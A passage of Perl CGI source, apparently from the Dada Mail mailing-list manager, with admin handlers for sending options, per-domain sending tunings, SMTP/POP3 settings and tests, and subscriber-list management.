    if($enable_bulk_batching == 1){ 
    
        if($bulk_sleep_amount > 0 && $mass_send_amount > 0){ 
	
            my $per_sec  = $mass_send_amount / $bulk_sleep_amount; 
        	$per_hour = int($per_sec * 60 *60 + .5); # DEV .5 is some sort of rounding thing (with int). That's wrong. 

			$num_subs    = $lh->num_subscribers; 
			my $total_hours = 0; 
			if($num_subs > 0 && $per_hour > 0){ 	
				$total_hours = $lh->num_subscribers / $per_hour; 
			}
			
			$per_hour      = commify($per_hour); 
			
			$time_to_send = _formatted_runtime($total_hours * 60 * 60); 
			
        }
        else{ 
            $somethings_wrong = 1; 
        }
    }
    
	require DADA::Template::Widgets; 
	print DADA::Template::Widgets::screen(
		{
			-screen => 'previewBatchSendingSpeed_widget.tmpl', 
			-vars   => { 
				enable_bulk_batching => $enable_bulk_batching, 
				per_hour             => $per_hour, 
				num_subscribers      => $num_subs,
				time_to_send         => $time_to_send, 
				somethings_wrong     => $somethings_wrong, 
			}
		}
		
	); 



}




sub commify {
   my $input = shift;
   $input = reverse $input;
   $input =~ s/(\d\d\d)(?=\d)(?!\d*\.)/$1,/g;
   return reverse $input;
}







sub adv_sending_options { 


    my ($admin_list, $root_login) =  check_list_security(-cgi_obj    => $q,
                                                         -Function   => 'sending_options');
    $list = $admin_list;
  
    require DADA::Security::Password; 
    require DADA::MailingList::Settings;
           $DADA::MailingList::Settings::dbi_obj = $dbi_handle; 

    my $ls = DADA::MailingList::Settings->new({-list => $list}) ; 
    my $li = $ls->get; 
    
    if(!$process){ 
                             

        unshift(@DADA::Config::CHARSETS, $li->{charset});
        my $precedence_popup_menu = $q->popup_menu(-name    =>  "precedence", 
                                                    -value   => [@DADA::Config::PRECEDENCES],
                                                    -default =>  $li->{precedence}, 
                                                    );
        
        my $priority_popup_menu = $q->popup_menu(-name    =>  "priority", 
                                                 -value   => [keys %DADA::Config::PRIORITIES],
                                                 -labels  => \%DADA::Config::PRIORITIES,
                                                 -default =>  $li->{priority}, 
                                                );
        
        my $charset_popup_menu = $q->popup_menu(-name   => 'charset', 
                                                -value  => [@DADA::Config::CHARSETS], 
                                               );                                                                              
                                                              
        my $plaintext_encoding_popup_menu =  $q->popup_menu( -name    => 'plaintext_encoding', 
                                                             -value   => [@DADA::Config::CONTENT_TRANSFER_ENCODINGS], 
                                                             -default =>  $li->{plaintext_encoding}, 
                                                             );
        
        my $html_encoding_popup_menu = $q->popup_menu(-name    => 'html_encoding', 
                                                      -value   => [@DADA::Config::CONTENT_TRANSFER_ENCODINGS], 
                                                      -default =>  $li->{html_encoding},
                                                     );
                                     

        my $wrong_uid = 0; 
           $wrong_uid = 1 
            if $< != $>;

	
    my $can_mime_encode = 1; 
    eval {require MIME::EncWords;};
    if($@){ 
		$can_mime_encode = 0; 
	}
    print(admin_template_header(-Title      => "Advanced Sending Options", 
                            -List       => $list, 
                            -Root_Login => $root_login));
    
    require DADA::Template::Widgets;
    print   DADA::Template::Widgets::screen({-screen => 'adv_sending_options_screen.tmpl', 
                                                -list   => $list,
                                                -vars   => { 
	
															screen                        => 'adv_sending_options', 
															title                         => 'Advanced Sending Options', 
															
                                                            done                          => $done, 
                                                            precedence_popup_menu         => $precedence_popup_menu, 
                                                            priority_popup_menu           => $priority_popup_menu, 
                                                            charset_popup_menu            => $charset_popup_menu, 
                                                            plaintext_encoding_popup_menu => $plaintext_encoding_popup_menu, 
                                                            html_encoding_popup_menu      => $html_encoding_popup_menu, 
                                                            #content_type_popup_menu       => $content_type_popup_menu, 
                                                            
                                                            strip_message_headers         => $li->{strip_message_headers}, 
                                                            print_list_headers            => $li->{print_list_headers}, 
                                                            add_sendmail_f_flag           => $li->{add_sendmail_f_flag}, 
                                                            f_flag_settings               => $DADA::Config::MAIL_SETTINGS . ' -f' . $li->{admin_email},
                                                            wrong_uid                     => $wrong_uid, 
                                                            print_errors_to_header        => $li->{print_errors_to_header}, 
                                                            print_return_path_header      => $li->{print_return_path_header}, 
                                                            use_habeas_headers            => $li->{use_habeas_headers}, 
                                                            verp_return_path              => $li->{verp_return_path},
                                                            use_domain_sending_tunings    => ($li->{use_domain_sending_tunings} ? 1 : 0), 
                                                            
															mime_encode_words_in_headers  => $li->{mime_encode_words_in_headers}, 
															can_mime_encode               => $can_mime_encode, 
															can_use_twitter               => DADA::App::Guts::can_use_twitter(), 
															twitter_mass_mailings         => $li->{twitter_mass_mailings}, 
															twitter_username              => $li->{twitter_username}, 
															twitter_password              => DADA::Security::Password::cipher_decrypt($li->{cipher_key}, $li->{twitter_password}),       
                                            		}
                                            
                                            });
                                           
        print(admin_template_footer(-List => $list));

    }else{ 


        my $precedence                = $q->param('precedence');
        my $priority                  = $q->param('priority');
        my $charset                   = $q->param('charset');
        my $plaintext_encoding        = $q->param('plaintext_encoding'); 
        my $html_encoding             = $q->param('html_encoding');
        #my $content_type              = $q->param('content_type');
        my $strip_message_headers     = $q->param('strip_message_headers')    || 0;
        my $add_sendmail_f_flag          = $q->param('add_sendmail_f_flag')      || 0;
        my $print_return_path_header  = $q->param('print_return_path_header') || 0;
        my $print_errors_to_header    = $q->param('print_errors_to_header')   || 0;
        my $print_list_headers          = $q->param('print_list_headers')       || 0;
        my $verp_return_path          = $q->param('verp_return_path')         || 0; 
        my $use_habeas_headers        = $q->param('use_habeas_headers')       || 0; 

        my $use_domain_sending_tunings = $q->param('use_domain_sending_tunings') || 0; 
		
		my $mime_encode_words_in_headers = $q->param('mime_encode_words_in_headers') || 0; 
		
		my $twitter_mass_mailings = $q->param('twitter_mass_mailings') || 0; 
		my $twitter_username      = $q->param('twitter_username') || ''; 
		my $twitter_password      = $q->param('twitter_password') || ''; 
		
		
		
		
        $ls->save({
                   precedence               => $precedence,
                   priority                 => $priority,
                   charset                  => $charset, 
                   #content_type             => $content_type,
                   strip_message_headers    => $strip_message_headers,
                   add_sendmail_f_flag      => $add_sendmail_f_flag,
                   print_list_headers       => $print_list_headers,
                   print_return_path_header => $print_return_path_header,
                   print_errors_to_header   => $print_errors_to_header, 
                   plaintext_encoding       => $plaintext_encoding, 
                   html_encoding            => $html_encoding,
                   verp_return_path         => $verp_return_path, 
                   use_habeas_headers       => $use_habeas_headers, 
                   
                   use_domain_sending_tunings    => $use_domain_sending_tunings, 
				   mime_encode_words_in_headers  => $mime_encode_words_in_headers, 
				
					twitter_mass_mailings  => $twitter_mass_mailings,
					twitter_username       => $twitter_username, 
					twitter_password       => DADA::Security::Password::cipher_encrypt($li->{cipher_key}, $twitter_password),      
		
                   });

        print $q->redirect(-uri=>$DADA::Config::S_PROGRAM_URL . '?flavor=adv_sending_options&done=1'); 
    }
}



sub sending_tuning_options { 

    my ($admin_list, $root_login) =  check_list_security(-cgi_obj    => $q,
                                                         -Function   => 'sending_tuning_options');
                                                         
                                                         
    my @allowed_tunings = qw(
        domain
        send_via_smtp
        add_sendmail_f_flag
        print_return_path_header
        verp_return_path
    ); 
    
    $list = $admin_list;
   
    require DADA::MailingList::Settings;
           $DADA::MailingList::Settings::dbi_obj = $dbi_handle; 
    
    my $ls = DADA::MailingList::Settings->new({-list => $list}); 
    my $li = $ls->get; 
    
   if($process eq 'remove_all'){ 
   
        $ls->save({domain_sending_tunings => ''});
        print $q->redirect(-uri => $DADA::Config::S_PROGRAM_URL . '?flavor=sending_tuning_options&done=1&remove=1'); 

   }elsif($process == 1){ 
   
        my $tunings = eval($li->{domain_sending_tunings});
        #my $errors  = {}; 
        
        
        if($q->param('new_tuning') == 1){ 
        
            my $new_tuning = {};
            my $p_list = $q->Vars;
            
            foreach(keys %$p_list){ 
                if($_ =~ m/^new_tuning_/){ 
                    my $name = $_;
                       $name =~ s/^new_tuning_//;
                    $new_tuning->{$name} = $q->param($_); 
                    
                   # if($p_list->{new_tuning_domain}){
                   #    # TO DO domain regex needs some work...
                   #     if(DADA::App::Guts($p_list->{new_tuning_domain}) == 0 && $p_list->{new_tuning_domain} !~ m/^([a-z]+[-]*(?=[a-z]|\d)\d*[a-z]*)\.(.*?)/){ 
                   #         $errors{not_a_domain} = 1; 
                   #     }
                   # }
                }
            }
            
            if($new_tuning->{domain}){ # really, the only required field.
            #if(! keys %$errors){ 
              push(@$tunings, $new_tuning);
           # }
             }
        }
        
       # if(! keys %$errors){ 
        
            require Data::Dumper; 
            my $tunes = Data::Dumper->new([$tunings]); 
               $tunes->Purity(1)->Terse(1)->Deepcopy(1);
            $ls->save({domain_sending_tunings => $tunes->Dump}); 
       #}
        
        print $q->redirect(-uri => $DADA::Config::S_PROGRAM_URL . '?flavor=sending_tuning_options&done=1'); 
        
   }elsif($q->param('process_edit') =~ m/Edit/i) {
        
        if($q->param('domain')){
        
            my $saved_tunings = eval($li->{domain_sending_tunings});
            my $new_tunings = []; 
            
            foreach my $st(@$saved_tunings){
            
                if($st->{domain} eq $q->param('domain')) { 
                    
                    foreach my $a_tuning(@allowed_tunings){ 
            
                        my $new_tune = $q->param($a_tuning) || 0;
                        #  if($q->param($a_tuning)){ 
                            $st->{$a_tuning} = $new_tune; 
                        # }
                    }
                }
            }
            
            
            require Data::Dumper; 
            my $tunes = Data::Dumper->new([$saved_tunings]); 
               $tunes->Purity(1)->Terse(1)->Deepcopy(1);
            $ls->save({domain_sending_tunings => $tunes->Dump}); 
            
        }
        
        print $q->redirect(-uri => $DADA::Config::S_PROGRAM_URL . '?flavor=sending_tuning_options&done=1&edit=1'); 


   }elsif($q->param('process_edit') =~ m/Remove/i) {
   
        if($q->param('domain')){
        
            my $saved_tunings = eval($li->{domain_sending_tunings});
            my $new_tunings = []; 

            foreach(@$saved_tunings){
            
                if($_->{domain} ne $q->param('domain')) { 
                    push(@$new_tunings, $_); 
                }
            
            }
            
            require Data::Dumper; 
            my $tunes = Data::Dumper->new([$new_tunings]); 
               $tunes->Purity(1)->Terse(1)->Deepcopy(1);
            $ls->save({domain_sending_tunings => $tunes->Dump}); 

        }
        
       print $q->redirect(-uri => $DADA::Config::S_PROGRAM_URL . '?flavor=sending_tuning_options&done=1&remove=1'); 
 
   
   } else { 
   
   
       my $li = $ls->get; 
       
       my $saved_tunings = eval($li->{domain_sending_tunings}); 
       
       # This is done because variables inside loops are local, not global, and global vars don't work in loops. 
       my $c = 0; 
       foreach(@$saved_tunings){ 
        $saved_tunings->[$c]->{S_PROGRAM_URL} = $DADA::Config::S_PROGRAM_URL;
        $c++; 
       }
       
        print(admin_template_header(      
              -Title      => "Domain-Specific Sending Tuning", 
              -List       => $list, 
              -Root_Login => $root_login,
              -Form       => 0, 
              
              ));
              
        require DADA::Template::Widgets;
        print DADA::Template::Widgets::screen({-screen => 'sending_tuning_options.tmpl', 
                                              -vars   => {
                                                                    
                                                            tunings => $saved_tunings, 
                                                            done    => ($q->param('done')   ? 1 : 0), 
                                                            edit    => ($q->param('edit')   ? 1 : 0), 
                                                            remove  => ($q->param('remove') ? 1 : 0), 
                                                            
                                                            use_domain_sending_tunings => ($li->{use_domain_sending_tunings} ? 1 : 0), 
                                                            
                                                            # For pre-filling in the "new" forms
                                                            list_send_via_smtp               => $li->{send_via_smtp}, 
                                                            list_add_sendmail_f_flag         => $li->{add_sendmail_f_flag}, 
                                                            list_print_return_path_header    => $li->{print_return_path_header}, 
                                                            list_verp_return_path            => $li->{verp_return_path}, 
    
                                                      },
                                             });
        
        print(admin_template_footer(-List => $list, -Form => 0, ));

    }

}




sub smtp_options { 
    
    my ($admin_list, $root_login) = check_list_security(
										-cgi_obj  => $q, 
                                        -Function => 'smtp_options'
									);
                                                        
    
    
    
    $list = $admin_list;

    require DADA::MailingList::Settings;
           $DADA::MailingList::Settings::dbi_obj = $dbi_handle; 

    my $ls = DADA::MailingList::Settings->new({-list => $list}); 
    my $li = $ls->get; 

    require DADA::Security::Password;
 
        
    my $decrypted_sasl_pass = q{};
    if($li->{sasl_smtp_password}){
         $decrypted_sasl_pass = DADA::Security::Password::cipher_decrypt($li->{cipher_key}, $li->{sasl_smtp_password});      
   }
   
    my $decrypted_pop3_pass = q{};
    if($li->{pop3_password}){ 
        $decrypted_pop3_pass = DADA::Security::Password::cipher_decrypt($li->{cipher_key}, $li->{pop3_password}); 
    }
    
	# DEV: This is really strange, since if Net::SMTP isn't available, SMTP sending is completely broken. 
    my $can_use_net_smtp = 0;
     eval { require Net::SMTP_auth };
    if(!$@){ 
        $can_use_net_smtp = 1;
    }


    my $can_use_smtp_ssl = 0;
     eval { require Net::SMTP::SSL };
    if(!$@){ 
        $can_use_smtp_ssl = 1;
    }
    
    my $can_use_ssl = 0;
     eval { require IO::Socket::SSL };
    if(!$@){ 
        $can_use_ssl = 1;
    }
    
    my $mechanism_popup; 
    if($can_use_net_smtp){ 
    
        $mechanism_popup = $q->popup_menu(-name     => 'sasl_auth_mechanism',
 										  -id       => 'sasl_auth_mechanism', 
                                          -default  => $li->{sasl_auth_mechanism}, 
                                          '-values' => [qw(PLAIN LOGIN DIGEST-MD5 CRAM-MD5)],
                                         );
    }
    
    my $pop3_auth_mode_popup =  $q->popup_menu(-name     => 'pop3_auth_mode', 
										 -id => 'pop3_auth_mode', 
                                          -default  => $li->{pop3_auth_mode}, 
                                          '-values' => [qw(BEST PASS APOP CRAM-MD5)],
                                           -labels   => {BEST => 'Automatic'},

                                         );
    
    if(!$process){
    

        
        my $scr;     
        $scr .= admin_template_header( 
              #-HTML_Header => 0, 
              -Title       => "SMTP Sending Options", 
              -List        => $li->{list}, 
              -Root_Login  => $root_login);
              
        require  DADA::Template::Widgets;
        $scr .=  DADA::Template::Widgets::screen({-list   => $list, 
                                                -screen => 'smtp_options_screen.tmpl', 

                                                          -vars  => 
                                                          {     
																screen              => 'smtp_options', 
																title               => 'SMTP Options', 
																
																done                => $done, 
                                                                smtp_server         => $li->{smtp_server}, 
                                                                smtp_port           => $li->{smtp_port},
                                                                
                                                                use_smtp_ssl        =>  $li->{use_smtp_ssl},
                                                                
                                                                mechanism_popup     => $mechanism_popup, 
                                                                
                                                                can_use_smtp_ssl    =>  $can_use_smtp_ssl, 
                                                                use_pop_before_smtp => $li->{use_pop_before_smtp},
                                                                pop3_server         => $li->{pop3_server}, 
                                                                pop3_username       => $li->{pop3_username}, 
                                                                decrypted_pop3_pass => $decrypted_pop3_pass, 
																
																pop3_use_ssl        => $li->{pop3_use_ssl}, 
                                                                
                                                                pop3_auth_mode_popup => $pop3_auth_mode_popup, 
                                                                can_use_ssl          => $can_use_ssl, 
                                                                
                                                                set_smtp_sender     => $li->{set_smtp_sender},
																smtp_connection_per_batch => $li->{smtp_connection_per_batch}, 
                                                                
                                                                admin_email         => $li->{admin_email}, 
                                                                
                                                                use_sasl_smtp_auth  => $q->param('use_sasl_smtp_auth') ? $q->param('use_sasl_smtp_auth') : $li->{use_sasl_smtp_auth},
                                                                
                                                                 
                                                                decrypted_pop3_pass => $q->param('pop3_password')      ? $q->param('pop3_password')      : $decrypted_pop3_pass,
                                                                
                                                                sasl_auth_mechanism => $q->param('sasl_auth_mechanism') ? $q->param('sasl_auth_mechanism') : $li->{sasl_auth_mechanism},
                                                                sasl_smtp_username  => $q->param('sasl_smtp_username') ? $q->param('sasl_smtp_username') : $li->{sasl_smtp_username}, 
                                                                
                                                                sasl_smtp_password  => $q->param('sasl_smtp_password') ? $q->param('sasl_smtp_password') : $decrypted_sasl_pass, 

                                                                
                                                          },
                                                          });
                                                          
                                                                # is that last line right?!

        $scr .=  admin_template_footer(-List => $list);
               
  
        e_print($scr); 
        

        
    }else{ 
    
        my $use_pop_before_smtp = $q->param('use_pop_before_smtp')       || 0;
        my $set_smtp_sender     = $q->param('set_smtp_sender')           || 0;
        
        my $smtp_server         = strip($q->param('smtp_server'));
        
        my $pop3_server         = strip($q->param('pop3_server'))        || '';
        my $pop3_username       = strip($q->param('pop3_username'))      || '';
        

		my $pop3_password       = strip($q->param('pop3_password'))      || undef;
        if(defined($pop3_password)){ 
			$pop3_password = DADA::Security::Password::cipher_encrypt($li->{cipher_key}, $pop3_password);
		}

		my $pop3_use_ssl        = strip($q->param('pop3_use_ssl'))       || ''; 
        my $pop3_auth_mode      = strip($q->param('pop3_auth_mode'))     || 'BEST', 
        my $use_smtp_ssl        = $q->param('use_smtp_ssl')              || 0; 
        
        my $sasl_auth_mechanism = $q->param('sasl_auth_mechanism')       || undef, 
        my $use_sasl_smtp_auth  = $q->param('use_sasl_smtp_auth')        || 0; 
        my $sasl_smtp_username  = strip($q->param('sasl_smtp_username')) || ''; 
        

		my $sasl_smtp_password  = strip($q->param('sasl_smtp_password')) || undef;
		if(defined($sasl_smtp_password)){ 
			$sasl_smtp_password = DADA::Security::Password::cipher_encrypt($li->{cipher_key}, $sasl_smtp_password)
		}

        my $smtp_port           = strip($q->param('smtp_port'))          || undef; 
     	my $smtp_connection_per_batch = strip($q->param('smtp_connection_per_batch')) || 0;
        
        $ls->save({
        
             smtp_port                 => $smtp_port,
            #smtp_connect_tries       => $smtp_connect_tries, 
            use_pop_before_smtp       => $use_pop_before_smtp,
            
            use_smtp_ssl              => $use_smtp_ssl, 
            smtp_server               => $smtp_server,
            
            pop3_server               => $pop3_server,    
            pop3_username             => $pop3_username, 
            
            pop3_password             => $pop3_password,    
            
			pop3_use_ssl              => $pop3_use_ssl, 
			pop3_auth_mode            => $pop3_auth_mode, 
			
            use_sasl_smtp_auth        => $use_sasl_smtp_auth, 
            sasl_auth_mechanism       => $sasl_auth_mechanism, 
            sasl_smtp_username        => $sasl_smtp_username, 
            sasl_smtp_password        => $sasl_smtp_password,
            set_smtp_sender           => $set_smtp_sender, 
        	smtp_connection_per_batch => $smtp_connection_per_batch, 
			
}); 
              
        if($q->param('no_redirect') == 1){ 
        
        #     print "Status: 204 No Response";
         } else { 
            print $q->redirect(-uri => $DADA::Config::S_PROGRAM_URL . '?flavor=smtp_options&done=1'); 
        }
    }
}

sub smtp_test_results {

    my ( $admin_list, $root_login ) = check_list_security(
        -cgi_obj  => $q,
        -Function => 'smtp_options'
    );

    my $list = $admin_list;
    $q->param( 'no_redirect', 1 );

	# Saves the params passed
    smtp_options();

    require DADA::Mail::Send;
    require DADA::MailingList::Settings;

    my $ls = DADA::MailingList::Settings->new( { -list => $admin_list } );
    my $li = $ls->get;

    my $mh = DADA::Mail::Send->new(
        {
            -list   => $list,
            -ls_obj => $ls,
        }
    );

    my ( $results, $lines, $report ) = $mh->smtp_test;
    $results =~ s/\</&lt;/g;
    $results =~ s/\>/&gt;/g;

    my $ht_report = [];

    foreach my $f (@$report) {

        my $s_f = $f->{line};
        $s_f =~ s{Net\:\:SMTP(.*?)\)}{};
        push ( @$ht_report,
            { SMTP_command => $s_f, message => $f->{message} } );
    }

    print $q->header();

    require DADA::Template::Widgets;
    print DADA::Template::Widgets::screen(
        {
            -screen => 'smtp_test_results_widget.tmpl',
            -vars   => {
                report  => $ht_report,
                raw_log => $results,
            }
        }
    );

}

sub checkpop { 

    my ($admin_list, $root_login) = check_list_security(-cgi_obj  => $q, 
                                                        -Function => 'smtp_options');
    
    $list = $admin_list;
    
    require DADA::Security::Password;
    
    my $user    = $q->param('user'); 
    my $pass    = $q->param('pass'); 
    my $server  = $q->param('server'); 
	my $use_ssl = $q->param('use_ssl') || 0; 
	my $mode    = $q->param('mode')    || 'BEST'; 
    
    
    require  DADA::MailingList::Settings; 
    my $ls = DADA::MailingList::Settings->new({-list => $list}); 
    my $li = $ls->get; 
    
    require DADA::Mail::Send; 
    my $mh         = DADA::Mail::Send->new(
						{
							-list   => $list, 
							-ls_obj => $ls, 
						}
					 );
    my $pop_status;
    
    if(!$user || !$pass || !$server){ 
        $pop_status = undef; 
    }else{
        $pop_status = $mh->_pop_before_smtp(
						-pop3_server    => $server, 
                        -pop3_username  => $user, 
                        -pop3_password  => $pass,
						-pop3_auth_mode => $mode, 
						-pop3_use_ssl   => $use_ssl, 
					);
    }

    print $q->header();
	# DEV: These need to be templated out!
    if(defined($pop_status)){ 
        print $q->h2("Success!"); 
        print $q->p($q->b("POP-before-SMTP authentication was successful")); 
        print $q->p($q->b("Make sure to 'Save Changes' to have your edits take affect.")); 
    }else{ 
        print $q->h2("Warning!"); 
        print $q->p($q->b('POP-before-SMTP authentication was ',$q->i('unsuccessful'),));    
    }
}




sub view_list { 

    my ($admin_list, $root_login) = check_list_security(
		-cgi_obj  => $q,  
		-Function => 'view_list'
	);                                              
    $list  = $admin_list; 
	if(defined($q->param('list'))){ 
		if($list ne $q->param('list')){ 
			# I should look instead to see if we're logged in view ROOT and then just 
			# *Switch* the login. Brilliant! --- maybe I don't want to switch lists automatically - without 
			# someone perhaps knowing that THAT's what I did...
			logout(
				-redirect_url => $DADA::Config::S_PROGRAM_URL . '?' . $q->query_string(), 
			);
			return; 
		}
	}



    require DADA::MailingList::Settings;
           $DADA::MailingList::Settings::dbi_obj = $dbi_handle; 

    my $ls = DADA::MailingList::Settings->new({-list => $list}); 
    my $li = $ls->get; 
         
    my $lh                    = DADA::MailingList::Subscribers->new({-list => $list});
    
    my $start                 = int($q->param('start')) || 0; 
    my $length                = $li->{view_list_subscriber_number}; 
    my $num_subscribers       = $lh->num_subscribers(-Type => $type);
    my $screen_finish         = $length+$start;
       $screen_finish         =  $num_subscribers if $num_subscribers < $length+$start;
    my $screen_start          = $start; 
       $screen_start          = 1 if (($start == 0) && ($num_subscribers != 0)); 
    my $previous_screen       = $start-$length; 
    my $next_screen           = $start+$length; 

    my $subscribers           = $lh->subscription_list(
									{ 
										-start    => $start, 
										'-length' => $length, 
										-type     => $type,
									}
								); 
    my $email_count           = $q->param('email_count');
    my $delete_email_count    = $q->param('delete_email_count'); 
    my $approved_count        = $q->param('approved_count'); 
    my $denied_count          = $q->param('denied_count'); 
                                                

    if($process eq 'set_black_list_prefs'){ 
                
        my $black_list                           = $q->param('black_list')                           || 0; 
        my $add_unsubs_to_black_list             = $q->param('add_unsubs_to_black_list')             || 0;
        my $allow_blacklisted_to_subscribe       = $q->param('allow_blacklisted_to_subscribe')       || 0;
        my $allow_admin_to_subscribe_blacklisted = $q->param('allow_admin_to_subscribe_blacklisted') || 0;
        
        
        $ls->save({    
                    black_list                           => $black_list, 
                    add_unsubs_to_black_list             => $add_unsubs_to_black_list,
                    allow_blacklisted_to_subscribe       => $allow_blacklisted_to_subscribe,
                    allow_admin_to_subscribe_blacklisted => $allow_admin_to_subscribe_blacklisted
                  
                  }); 
        
        print $q->redirect(-uri => $DADA::Config::S_PROGRAM_URL . '?flavor=view_list&type=black_list&black_list_changes_done=1'); 
        return; 

    }elsif($process eq 'set_white_list_prefs'){ 
                
        my $enable_white_list = $q->param('enable_white_list') || 0;         

        $ls->save({
                    enable_white_list => $enable_white_list, 
                 }); 
        
        print $q->redirect(-uri => $DADA::Config::S_PROGRAM_URL . '?flavor=view_list&type=white_list&white_list_changes_done=1'); 
        return; 

        
    }else{ 
        
        require DADA::ProfileFieldsManager; 
		my $pfm = DADA::ProfileFieldsManager->new;
		my $fields_attr = $pfm->get_all_field_attributes;
		
        my $field_names = []; 
        foreach(@{$lh->subscriber_fields}){ 
            push(@$field_names, {name => $_, label => $fields_attr->{$_}->{label}}); 
        }
        
            print(admin_template_header(-Title      => $type_title, 
                                -List       => $list,
                                -Root_Login => $root_login,
                                -Form       => 0
                               ));
        
        require DADA::Template::Widgets;
        print   DADA::Template::Widgets::screen({-list  => $list,
                                                -screen => 'view_list_screen.tmpl', 
                                                  -vars  => 
                                                  { 
                                                  
													 screen                      => 'view_list', 
													 title                       => 'View', 
													
                                                     field_names                 => $field_names,
                                                     
                                                     view_list_subscriber_number => $li->{view_list_subscriber_number},
                                                     next_screen                 => $next_screen,  
                                                     previous_screen             => $previous_screen, 
                                                     use_previous_screen         => ($start-$length >= 0 && $start > 0) ? 1 : 0, 
                                                     num_subscribers             => $num_subscribers, 
                                                     show_next_screen_link       => ($num_subscribers > ($start + $length)) ? 1 : 0, 
                                                     screen_start                => $screen_start, 
                                                     screen_finish               => $screen_finish, 
                                                     delete_email_count          => $delete_email_count,
                                                     email_count                 => $email_count,
 													 approved_count              => $approved_count, 
													 denied_count                => $denied_count, 
                                                     subscribers                 => $subscribers,
                                                     
                                                     type                        => $type, 
                                                     type_title                  => $type_title,

                                                     
                                                     
                                                     list_type_isa_list                  => ($type eq 'list')       ? 1 : 0, 
                                                     list_type_isa_black_list            => ($type eq 'black_list') ? 1 : 0, 
                                                     list_type_isa_authorized_senders    => ($type eq 'authorized_senders') ? 1 : 0, 
                                                     list_type_isa_testers               => ($type eq 'testers')    ? 1 : 0, 
                                                     list_type_isa_white_list            => ($type eq 'white_list') ? 1 : 0, 
                                                     list_type_isa_sub_request_list      => ($type eq 'sub_request_list') ? 1 : 0, 
                                                     

                                                     GLOBAL_BLACK_LIST           => $DADA::Config::GLOBAL_BLACK_LIST, 
                                                     GLOBAL_UNSUBSCRIBE          => $DADA::Config::GLOBAL_UNSUBSCRIBE, 
                                                     
                                                     can_use_global_black_list   => $lh->can_use_global_black_list, 
                                                     can_use_global_unsubscribe  => $lh->can_use_global_unsubscribe, 
                                                     
                                                     can_filter_subscribers_through_blacklist => $lh->can_filter_subscribers_through_blacklist, 
                                                     
                                                     black_list_changes_done     => ($q->param('black_list_changes_done')) ? 1 : 0, 
                                                     
                                                     black_list                           => $li->{black_list},
                                                     add_unsubs_to_black_list             => $li->{add_unsubs_to_black_list},
                                                     allow_blacklisted_to_subscribe       => $li->{allow_blacklisted_to_subscribe},
                                                     allow_admin_to_subscribe_blacklisted => $li->{allow_admin_to_subscribe_blacklisted}, 
                                                     
                                                     flavor                      => 'view_list', 
                                                     
                                                     
                                                     enable_white_list           => $li->{enable_white_list}, 
                                                     
                                                     enable_authorized_sending   => $li->{enable_authorized_sending},
                                                     
                                                     list_subscribers_num             => $lh->num_subscribers(-Type => 'list'), 
                                                     black_list_subscribers_num       => $lh->num_subscribers(-Type => 'black_list'), 
                                                     white_list_subscribers_num       => $lh->num_subscribers(-Type => 'white_list'), 
                                                     authorized_senders_num           => $lh->num_subscribers(-Type => 'authorized_senders'),
 													 sub_request_list_subscribers_num => $lh->num_subscribers(-Type => 'sub_request_list'),
                                                  	 flavor_is_view_list              => 1,
													},
													-list_settings_vars_param => { 
														-list    => $list,
														-dot_it => 1, 
													},
                                                  }); 
                                                          
        print(admin_template_footer(-List => $list, -Form => 0));
        
    }
}

sub subscription_requests { 
	
	my ($admin_list, $root_login) = check_list_security(
		-cgi_obj  => $q,  
		-Function => 'view_list'
	);
    $list  = $admin_list; 

	if(defined($q->param('list'))){ 
		if($list ne $q->param('list')){ 	
			logout(
				-redirect_url => $DADA::Config::S_PROGRAM_URL . '?' . $q->query_string(), 
			);
			return; 
		}
	}


	my @address = $q->param('address') || (); 
	my $count   = 0;
	require DADA::MailingList::Settings;
           $DADA::MailingList::Settings::dbi_obj = $dbi_handle; 

    my $ls = DADA::MailingList::Settings   ->new({-list => $list}); 
    my $lh = DADA::MailingList::Subscribers->new({-list => $list});
	
	
	if($q->param('process') =~ m/approve/i){
		foreach my $email(@address){ 
			$lh->move_subscriber(
                {
                    -email            => $email,
                    -from             => 'sub_request_list',
                    -to               => 'list', 
	        		-mode             => 'writeover', 
	        		-confirmed        => 1, 
                }
			);
			
			my $new_pass    = ''; 
	        my $new_profile = 0;
			if(
	           $DADA::Config::PROFILE_ENABLED == 1 && 
	           $DADA::Config::SUBSCRIBER_DB_TYPE =~ m/SQL/
	        ){ 
	        	# Make a profile, if needed, 
	        	require DADA::Profile; 
	        	my $prof = DADA::Profile->new({-email => $email}); 
	        	if(!$prof->exists){ 
	        		$new_profile = 1; 
	        		$new_pass    = $prof->_rand_str(8);
	        		$prof->insert(
	        			{
	        				-password  => $new_pass,
	        				-activated => 1, 
	        			}
	        		); 
	        	}
	        	# / Make a profile, if needed, 
	        }
			require DADA::App::Messages;
            DADA::App::Messages::send_subscription_request_approved_message(
				{
	                -list   => $list, 
	                -email  => $email, 
	                -ls_obj => $ls, 
					#-test   => $self->test, 
					-vars         => {
        								new_profile        => $new_profile, 
        								'profile.email'    =>  $email, 
        								'profile.password' =>  $new_pass,
        								
        						 	 }
        		}
			);
			$count++; 
		} 
        print $q->redirect(-uri => $DADA::Config::S_PROGRAM_URL . '?f=view_list&type=' . $q->param('type') . '&approved_count=' . $count);
	}
	elsif($q->param('process') =~ m/deny/i){
		foreach my $email(@address){ 
			$lh->remove_subscriber(
	            {
	                -email            => $email,
	                -type             => 'sub_request_list',
	            }
			);
			require DADA::App::Messages;
            DADA::App::Messages::send_subscription_request_denied_message(
				{
	                -list   => $list, 
	                -email  => $email, 
	                -ls_obj => $ls, 
					#-test   => $self->test, 
        		}
			);
			$count++; 
		}
		print $q->redirect(-uri => $DADA::Config::S_PROGRAM_URL . '?f=view_list&type=' . $q->param('type') . '&denied_count=' . $count);

	}
	else { 
		die "unknown process!";
	}

}




sub remove_all_subscribers {

    my ( $admin_list, $root_login ) = check_list_security(
        -cgi_obj  => $q,
        -Function => 'view_list',
    );
    $list = $admin_list;
	
    my $type  = xss_filter( $q->param('type') );
    my $lh    = DADA::MailingList::Subscribers->new( { -list => $list } );
    my $count = $lh->remove_all_subscribers( { -type => $type, } );
    print $q->redirect(-uri => $DADA::Config::S_PROGRAM_URL . '?f=view_list&delete_email_count=' . $count .'&type=' . $type);
	return; 
}





sub filter_using_black_list { 

    
    my ($admin_list, $root_login) = check_list_security(-cgi_obj  => $q,
                                                        -Function => 'filter_using_black_list');
    $list = $admin_list;
    
    if(!$process){ 
        
        my $lh = DADA::MailingList::Subscribers->new({-list => $list}); 
        my $ls = DADA::MailingList::Settings->new({-list => $list}); 
        my $li = $ls->get; 
        
        my $filtered = $lh->filter_list_through_blacklist; 
        
        print(admin_template_header(-Title      => "Filtering Subscription List...", 
                            -List       => $list,
                            -Root_Login => $root_login,
